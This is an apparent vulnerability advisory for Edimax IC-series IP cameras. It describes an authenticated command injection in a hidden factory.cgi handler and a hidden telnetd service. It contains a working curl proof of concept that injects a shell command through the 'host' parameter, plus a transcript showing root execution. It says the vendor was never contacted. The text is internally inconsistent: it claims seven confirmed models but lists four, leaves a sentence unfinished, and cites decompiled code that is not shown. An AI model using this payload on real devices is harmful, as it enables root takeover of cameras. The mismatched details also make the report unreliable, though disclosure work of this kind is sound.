# Edimax IC series 3.07-3.10 was discovered to contain a command injection vulnerability in the hidden factory.cgi handler

## Overview

- Vendor: Edimax
- Product: IC-5150W 3.10, IC-5160GC 3.08, IC-7113W 3.10, IC-3140W 3.07
- Version: 3.07-3.10
- Component: /camera-cgi/private/factory.cgi (testIperf host, TestLEDNo)
- Vulnerability Class: CWE-78 command injection / CWE-912 hidden functionality
- Manufacturer: https://www.edimax.com/

## Affected version

- IC-5150W 3.10 package.
- The same `testIperf`/`host` chain was dynamically confirmed on all seven

## Vulnerability details

The hidden `private/factory.cgi` handles `testIperf=1` and passes the `host`
parameter into a shell command with `system`. `TestLEDNo`/`TestLEDStatus` is a
second injection point. The CGI is reachable only after lighttpd
`auth.require` and a `REMOTE_USER`/`sysadmin` check, so the attack is
authenticated or CSRF against an admin; `private/telnetd.cgi` can also start a
hidden telnetd.

## PoC

```sh
# GET is required; the POST path dereferences a NULL cgiQueryString.
curl -sS -G \
  --data-urlencode 'testIperf=1' \
  --data-urlencode 'host=;id' \
  --data-urlencode 'testTime=1' \
  http://<camera>/camera-cgi/private/factory.cgi
```

## Reproduction and terminal evidence

Environment: qemu-mips/qemu-mipsel user-mode with the extracted rootfs and
the firmware CGI library. `REMOTE_USER=admin` and the CGI environment
variables simulate an authenticated sysadmin; `factory.cgi` and `system` are
unchanged.

Terminal transcript (IC-5160GC):

```
$ URI_PATH=private/factory.cgi REMOTE_USER=admin ... qemu-mips ... ipcam_cgi
testIperf=1&host=;id&testTime=1
uid=0(root) gid=0(root)
```

Seven models returned `uid=0(root)` through the same parameter.

## Verification

The vulnerable handler in the stock `/camera-cgi/private/factory.cgi (testIperf host, TestLEDNo)` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Authenticated sysadmin (or CSRF) root command execution; hidden telnetd can
expose a root service.

## Remediation

- Remove factory/test CGI from production firmware or require a physical
  service mode.
- Validate `host` and `TestLEDNo`; use `execve`/argv for iperf/GPIO commands.
- Add CSRF tokens and keep the sysadmin auth check.

## Known CVE relation

- CVE-2018-8072 and CVE-2024-7616 cover older Edimax `ipcam_cgi` buffer
  issues; no CVE was found for `testIperf`/`TestLEDNo` or `telnetd.cgi`.
  Candidate 0-day for the seven tested models.

## Status and disclosure

Dynamic confirmation (qemu-user, seven models; simulated authenticated
environment). Candidate 0-day; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Edimax

### Product
IC-5150W 3.10, IC-5160GC 3.08, IC-7113W 3.10, IC-3140W 3.07

### Version or Commit
3.07-3.10

### Vulnerability Class
CWE-78 command injection / CWE-912 hidden functionality

### Description
The hidden private/factory.cgi testIperf handler passes the host parameter into a shell command through system(); TestLEDNo and TestLEDStatus form a second injection point. The CGI is reachable after lighttpd authentication and a REMOTE_USER check.

### Affected_component
/camera-cgi/private/factory.cgi (testIperf host, TestLEDNo)

### Attack_vector
Authenticated request to /camera-cgi/private/factory.cgi?testIperf=1 with host containing shell metacharacters.

### Product_version
IC-5150W 3.10, IC-5160GC 3.08, IC-7113W 3.10, IC-3140W 3.07 3.07-3.10

### Reference
- https://www.edimax.com/
- https://github.com/vuln-1/vuln/blob/main/Edimax/IC-5150W_V3.10/report-1.md
```
